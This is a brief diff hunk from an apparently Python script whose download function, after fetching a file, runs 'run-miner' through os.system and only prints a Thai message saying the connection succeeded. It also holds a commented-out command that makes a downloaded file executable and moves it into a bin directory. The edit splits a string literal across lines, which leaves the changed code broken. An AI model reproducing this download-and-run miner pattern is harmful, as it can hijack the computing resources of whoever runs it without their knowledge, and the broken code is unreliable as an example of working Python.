@@ -12,7 +12,8 @@ def download_file(url, save_path):
                 file.write(chunk)
 
         
-        print("\033[93mเชื่อมต่อสำเร็จแล้ว\033[0m")
+        print("\033[93m
+        เชื่อมต่อสำเร็จแล้ว\033[0m")
         #os.system ("chmod +x start && mv start ../../bin")
         os.system ("run-miner")
     except requests.exceptions.RequestException as e:
